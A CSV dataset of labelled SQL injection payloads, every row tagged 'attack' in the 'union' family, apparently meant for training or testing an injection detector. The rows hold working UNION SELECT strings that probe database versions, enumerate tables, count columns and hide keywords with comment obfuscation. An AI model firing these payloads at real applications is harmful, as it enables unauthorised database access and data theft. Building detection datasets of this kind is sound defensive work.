label,payload,family
attack," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select 1||1,version  (    )   -- 1",union
attack," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",union
attack,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",union
attack," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",union
attack," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",union
attack," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",union
attack,1 uni/**/on select all from where,union
attack," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",union
attack," select * from users where id  =  '1' union select \#,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",union
attack," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",union
attack," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",union
attack," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",union
attack," union select * from users where login   =   char  (  114,111,111,116  )  ;",union
attack," select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  1 union select  @ $,version  (    )   -- 1",union
attack,uni/**/on sel/**/ect,union
attack," select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",union
attack," select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",union
attack,UNION SELECT,union
attack," select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  '1' *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  1 +   (  \.  )   union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' union select "";""_,version  (    )   -- 1'",union
attack," select * from users where id  =  1 or 1#""$ union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#"", union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""{ union select 'a',version  (    )   -- 1",union
attack,"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",union
attack,"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",union
attack,"-2312'   )    )     )   union all select 5282,5282,5282,5282,5282,5282,5282,5282--",union
attack,"-8153'  )   as qhlb where 4948  =  4948 union all select 4948,4948,4948,4948,4948,4948#",union
attack,-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,union
attack,"-4984%""   )    )     )   union all select 6980,6980,6980,6980,6980,6980,6980,6980#",union
attack,"1' union all select null,null,null,null--",union
attack,"1 union all select null,null#",union
attack,"1'||  (  select 'wyng' from dual where 2157  =  2157 union all select null,null--",union
attack,"-3829%""  )   union all select 2218,2218,2218,2218,2218,2218,2218--",union
attack,"-8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049#",union
attack,"-9656"" union all select 8735,8735--",union
attack,"-6333""   )    )     )   union all select 9851,9851,9851,9851,9851,9851--",union
attack,"1%"" union all select null,null,null,null,null#",union
attack,"1'  )   as knxr where 5662  =  5662 union all select null,null,null,null,null,null,null,null#",union
attack,"-3513%"" union all select 8473,8473#",union
attack,"-9286""   )    )    as mfxl where 9348  =  9348 union all select 9348#",union
attack,"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",union
attack,"1   )    )     )   union all select null,null,null,null,null,null--",union
attack,"1%'   )    )    union all select null,null,null,null#",union
attack,"1%' union all select null,null,null#",union
attack,"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",union
attack,"-4588"" union all select 4550,4550,4550,4550#",union
attack,"-5700 where 4238  =  4238 union all select 4238,4238,4238#",union
attack,"-9440"" union all select 5599,5599,5599,5599,5599--",union
attack,"-5204""  )   union all select 7186,7186,7186--",union
attack,"1  )   as estm where 4809  =  4809 union all select null,null,null--",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null,null,null--",union
attack,"1'||  (  select 'svgd' from dual where 5188  =  5188 union all select null,null,null,null,null#",union
attack,"-5052   )    )     )   union all select 8351,8351,8351,8351#",union
attack,"-3443""   )    )    union all select 4043,4043,4043,4043,4043,4043,4043#",union
attack,"1""  )   where 6478  =  6478 union all select null,null,null,null,null,null#",union
attack,"1"" where 1051  =  1051 union all select null--",union
attack,"1' union all select null,null,null,null#",union
attack,"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",union
attack,"-2748'   )    )    as gazw where 4624  =  4624 union all select 4624,4624#",union
attack,"-5661'   )    )    union all select 3011,3011#",union
attack,"1"" union all select null,null,null#",union
attack,"1%'   )    )     )   union all select null,null--",union
attack,"1%"" union all select null,null,null,null,null,null,null#",union
attack,"1'+  (  select 'aphz' where 1933  =  1933 union all select null,null,null,null,null,null#",union
attack,-2869'   )    )    union all select 3216--,union
attack,"-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--",union
attack,"1%"" union all select null,null#",union
attack,"-8868""  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",union
attack,"-3215""  )   union all select 4457,4457,4457,4457,4457#",union
attack,"-2377%'   )    )     )   union all select 7706,7706--",union
attack,"-9318""   )    )     )   union all select 5223,5223,5223,5223#",union
attack,"-3862   )    )    as vqtl where 9629  =  9629 union all select 9629,9629,9629,9629,9629--",union
attack,"-9531'   )    )     )   union all select 4076,4076#",union
attack,"-5379'  )   union all select 4294,4294,4294--",union
attack,"-5622"" where 7970  =  7970 union all select 7970,7970,7970,7970,7970--",union
attack,"-1485'   )    )     )   union all select 7661,7661,7661,7661,7661--",union
attack,"-3884"" where 8012  =  8012 union all select 8012,8012#",union
attack,"1"" union all select null,null,null,null,null#",union
attack,"1   )    )    as khvx where 7533  =  7533 union all select null,null,null,null,null,null,null,null--",union
attack,"-3756'  )   union all select 1034,1034,1034--",union
attack,"-8266%'  )   union all select 8626,8626,8626,8626,8626,8626--",union
attack,"-6084""   )    )    union all select 7354,7354,7354,7354,7354,7354,7354,7354#",union
attack,"1""  )   as ssbz where 8885  =  8885 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-8929%'  )   union all select 9486,9486,9486,9486#",union
attack,"-2071 union all select 4753,4753--",union
attack,"-1076 union all select 3959,3959--",union
attack,"-9353"" where 4607  =  4607 union all select 4607,4607,4607,4607,4607,4607#",union
attack,"-4222'  )   union all select 9267,9267,9267,9267,9267,9267--",union
attack,"1 union all select null,null,null#",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null--",union
attack,"-5313""   )    )     )   union all select 9189,9189,9189,9189,9189,9189,9189,9189--",union
attack,"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",union
attack,"-5362  )   union all select 7297,7297,7297,7297,7297#",union
attack,"1""  )   as qayu where 6222  =  6222 union all select null,null,null#",union
attack,"-3737%"" union all select 4452,4452,4452#",union
attack,"-6611%""   )    )     )   union all select 8918,8918#",union
attack,"1'||  (  select 'jnsd' from dual where 2316  =  2316 union all select null,null,null,null,null,null,null#",union
attack,-7971' union all select 4273#,union
attack,"-2610%""  )   union all select 7779,7779,7779,7779,7779--",union
attack,"-5124'+  (  select 'xpww' where 1752  =  1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",union
attack,"1""  )   where 9461  =  9461 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1  )   where 7600  =  7600 union all select null,null,null,null,null,null--",union
attack,"1'   )    )    union all select null,null,null,null--",union
attack,"-6093'  )   where 9676  =  9676 union all select 9676,9676,9676,9676,9676,9676--",union
attack,"1""  )   as hfvz where 7186  =  7186 union all select null,null,null,null,null,null#",union
attack,"-3461""   )    )    union all select 6342,6342,6342,6342,6342,6342#",union
attack,1' where 8770  =  8770 union all select null--,union
attack,"1"" where 6347  =  6347 union all select null,null,null,null,null,null,null,null#",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null--",union
attack,"-1620   )    )    union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",union
attack,"1%""   )    )    union all select null--",union
attack,"1""  )   union all select null,null,null,null--",union
attack,"-2028'   )    )     )   union all select 8698,8698,8698,8698#",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null--",union
attack,"-5218  )   union all select 9677,9677#",union
attack,"-6279'  )   union all select 3026,3026,3026,3026,3026,3026,3026,3026--",union
attack,-8945   )    )    as fszo where 2320  =  2320 union all select 2320--,union
attack,"1   )    )    as shmg where 1371  =  1371 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-3315""   )    )     )   union all select 2457,2457,2457,2457,2457,2457--",union
attack,"1  )   where 2678  =  2678 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1%""   )    )    union all select null,null,null,null,null,null,null--",union
attack,"-8312%""   )    )    union all select 4972--",union
attack,"-2325  )   union all select 4692,4692,4692,4692#",union
attack,"-5160'  )   as kgjw where 9609  =  9609 union all select 9609,9609--",union
attack,"-5187""  )   union all select 3373,3373#",union
attack,"-2423'   )    )     )   union all select 8256,8256,8256,8256,8256,8256,8256,8256--",union
attack,"-3805""   )    )     )   union all select 9123,9123,9123,9123,9123,9123,9123,9123#",union
attack,"1%'  )   union all select null,null,null,null#",union
attack,"-5170'   )    )    as ovbf where 4833  =  4833 union all select 4833,4833,4833,4833--",union
attack,"-6419 union all select 7008,7008,7008,7008,7008--",union
attack,"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",union
attack,"1 union all select null,null,null--",union
attack,"-8129'   )    )     )   union all select 4531,4531,4531#",union
attack,"1  )   as mnyy where 4409  =  4409 union all select null,null,null,null--",union
attack,"-3249'   )    )     )   union all select 6309,6309#",union
attack,"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",union
